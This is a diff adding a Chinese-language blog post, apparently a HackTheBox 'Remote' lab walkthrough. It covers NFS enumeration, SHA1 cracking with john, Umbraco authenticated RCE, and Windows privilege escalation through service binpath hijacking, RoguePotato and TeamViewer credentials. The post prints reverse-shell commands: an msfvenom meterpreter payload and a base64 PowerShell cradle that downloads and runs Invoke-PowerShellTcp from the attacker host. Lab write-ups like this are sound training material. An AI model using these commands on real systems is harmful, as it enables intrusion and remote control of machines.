@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-material.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"evilarsene.icu","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Remote信息收集">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB:Remote">
+<meta property="og:url" content="http://evilarsene.icu/2020/10/28/HTB-Remote/index.html">
+<meta property="og:site_name" content="Love ❤ Hacking">
+<meta property="og:description" content="Remote信息收集">
+<meta property="og:locale">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/1.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/2.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/3.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/4.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/5.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/6.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/7.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/8.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/9.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/10.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/11.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/12.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/13.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/14.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/15.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/16.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/17.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/18.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/19.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/20.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/21.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/22.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/23.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/24.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/25.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/26.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/27.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/28.png">
+<meta property="og:image" content="http://evilarsene.icu/images/Remote/29.png">
+<meta property="article:published_time" content="2020-10-28T06:16:26.000Z">
+<meta property="article:modified_time" content="2020-10-28T11:23:10.723Z">
+<meta property="article:author" content="EvilArsene">
+<meta property="article:tag" content="Windows靶机">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://evilarsene.icu/images/Remote/1.png">
+
+<link rel="canonical" href="http://evilarsene.icu/2020/10/28/HTB-Remote/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>HTB:Remote | Love ❤ Hacking</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+    <a target="_blank" rel="noopener" href="https://github.com/TZESS" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Love ❤ Hacking</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">trickster</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://evilarsene.icu/2020/10/28/HTB-Remote/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="EvilArsene">
+      <meta itemprop="description" content="人格面具操控者">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Love ❤ Hacking">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          HTB:Remote
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-28 14:16:26 / 修改时间：19:23:10" itemprop="dateCreated datePublished" datetime="2020-10-28T14:16:26+08:00">2020-10-28</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HackTheBox/" itemprop="url" rel="index"><span itemprop="name">HackTheBox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Remote/1.png" alt="1"></p>
+<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>手动检查21ftp，允许匿名登录，但是没有文件，不允许上传</p>
+<p><img src="/images/Remote/2.png" alt="2"></p>
+<p>smb不允许匿名登录，也不允许空登录，也不允许guest登录</p>
+<p><img src="/images/Remote/3.png" alt="3"></p>
+<p>NFS枚举</p>
+<p><img src="/images/Remote/4.png" alt="4"></p>
+<p>似乎是网站的备份文件，应该是很重要的信息了，但是没有写权限</p>
+<p>再去检查80</p>
+<p><img src="/images/Remote/5.png" alt="5"></p>
+<p>得到Umbraco CMS</p>
+<p>尝试目录枚举，第一次失败了，可能触发了什么安全机制<br>更换小一点的字典，降低线程数，可以完成枚举</p>
+<p><img src="/images/Remote/6.png" alt="6"></p>
+<p>之后得到登录页面</p>
+<p><img src="/images/Remote/7.png" alt="7"></p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>nfs的目录是一个很好的突破点</p>
+<p><img src="/images/Remote/8.png" alt="8"></p>
+<p>找到了存在凭据的文件，文件不能直接读</p>
+<p><img src="/images/Remote/9.png" alt="9"></p>
+<p>通过strings，可以找到sha1的哈希</p>
+<p><img src="/images/Remote/10.png" alt="10"></p>
+<p>strings似乎并没有失去一些字符</p>
+<p><img src="/images/Remote/11.png" alt="11"></p>
+<p>破解</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash --format&#x3D;Raw-SHA1 --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/12.png" alt="12"></p>
+<p>凭据<code>admin@htb.local / baconandcheese</code>可以登录</p>
+<p><img src="/images/Remote/13.png" alt="13"></p>
+<p>在<code>Umbraco.sdf</code>中，似乎还发现了CMS版本</p>
+<p><img src="/images/Remote/14.png" alt="14"></p>
+<p>这样可以找到一个版本相同，且需要验证的漏洞</p>
+<p><img src="/images/Remote/15.png" alt="15"></p>
+<p>修改exp</p>
+<p><img src="/images/Remote/16.png" alt="16"></p>
+<p>如果<code>cmd /c</code>，否则RCE会失败</p>
+<p><img src="/images/Remote/17.png" alt="17"></p>
+<p>之后修改payload反弹powershell，注意转义</p>
+<p><img src="/images/Remote/18.png" alt="18"></p>
+<p>获得shell</p>
+<p><img src="/images/Remote/19.png" alt="19"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>powerup不好使，会出错，winpeas可以</p>
+<h3 id="Insecure-Service-Properties"><a href="#Insecure-Service-Properties" class="headerlink" title="Insecure Service Properties"></a>Insecure Service Properties</h3><p><img src="/images/Remote/20.png" alt="20"></p>
+<p>生成shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter_reverse_tcp LHOST&#x3D;10.10.16.98 LPORT&#x3D;443 -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>注意powershell下得使用sc.exe查看服务，而不是sc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe qc UsoSvc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/21.png" alt="21"></p>
+<p>修改路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;C:\Users\Public\Downloads\shell.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<p>重启服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net stop UsoSvc</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/22.png" alt="22"></p>
+<p>服务提权shell容易不稳定，最好migrate</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure>
+
+<p>获得system</p>
+<p><img src="/images/Remote/23.png" alt="23"></p>
+<p>powershell反弹shell很稳定</p>
+<p>先生成base64编码的反弹指令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;iex( IWR http:&#x2F;&#x2F;10.10.16.98&#x2F;winpriv&#x2F;Invoke-PowerShellTcp.ps1 -UseBasicParsing)&quot; | iconv -t UTF-16LE | base64 -w0</span><br></pre></td></tr></table></figure>
+
+<p><code>cmd /c</code>比较重要，直接powershell会出错，用<code>-EncodedCommand</code>进行解压</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config UsoSvc binpath&#x3D; &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot;</span><br><span class="line">net start UsoSvc</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/24.png" alt="24"></p>
+<h3 id="SeImpersonatePrivilege"><a href="#SeImpersonatePrivilege" class="headerlink" title="SeImpersonatePrivilege"></a>SeImpersonatePrivilege</h3><p>考虑到目标版本比较新，使用roguepotato</p>
+<p>这里需要指定CLSID，目标是<code>Windows Server 2019 Standard</code>，但是<code>Windows_10_Pro</code>和<code>Windows_10_Enterprise</code>某些CLSID仍然可用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.98 -c &quot;&#123;B91D5831-B1BD-4608-8198-D72E155020F7&#125;&quot; -e &quot;cmd &#x2F;c powershell -EncodedCommand aQBlAHgAKAAgAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADYALgA5ADgALwB3AGkAbgBwAHIAaQB2AC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkACgA&#x3D;&quot; -l 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/25.png" alt="25"></p>
+<h3 id="CVE-2019-18988"><a href="#CVE-2019-18988" class="headerlink" title="CVE-2019-18988"></a>CVE-2019-18988</h3><p>进程找到TeamViewer7</p>
+<p><img src="/images/Remote/26.png" alt="26"></p>
+<p>枚举版本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(Get-Command &quot;C:\Program Files (x86)\TeamViewer\Version7\TeamViewer.exe&quot;).version</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/27.png" alt="27"></p>
+<p>meterpreter有一个自动化提权:<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/12900/files">https://github.com/rapid7/metasploit-framework/pull/12900/files</a></p>
+<p><img src="/images/Remote/28.png" alt="28"></p>
+<p>有了凭据就好办 ，对方5895开放，直接evil-winrm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -u administrator -p &#39;!R3m0te!&#39; -i 10.10.10.180</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Remote/29.png" alt="29"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows%E9%9D%B6%E6%9C%BA/" rel="tag"># Windows靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/10/28/HTB-Traverxec/" rel="prev" title="HTB:Traverxec">
+      <i class="fa fa-chevron-left"></i> HTB:Traverxec
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/10/28/HTB-Postman/" rel="next" title="HTB:Postman">
+      HTB:Postman <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Remote"><span class="nav-number">1.</span> <span class="nav-text">Remote</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.1.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE"><span class="nav-number">1.1.2.</span> <span class="nav-text">枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F"><span class="nav-number">1.2.</span> <span class="nav-text">渗透</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Insecure-Service-Properties"><span class="nav-number">1.3.1.</span> <span class="nav-text">Insecure Service Properties</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SeImpersonatePrivilege"><span class="nav-number">1.3.2.</span> <span class="nav-text">SeImpersonatePrivilege</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2019-18988"><span class="nav-number">1.3.3.</span> <span class="nav-text">CVE-2019-18988</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="EvilArsene"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">EvilArsene</p>
+  <div class="site-description" itemprop="description">人格面具操控者</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/TZESS" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;TZESS" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/Arsene_IP" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;Arsene_IP" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilArsene</span>
+</div>
+
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数 */
+		var t1 = Date.UTC(2018,02,13,15,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已安全运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}/*因为建站时间还没有一年，就将之注释掉了。需要的可以取消*/
+	siteTime();
+</script>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script color='' opacity='' zIndex='' count='' src="/lib/canvas-nest/canvas-nest-nomobile.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
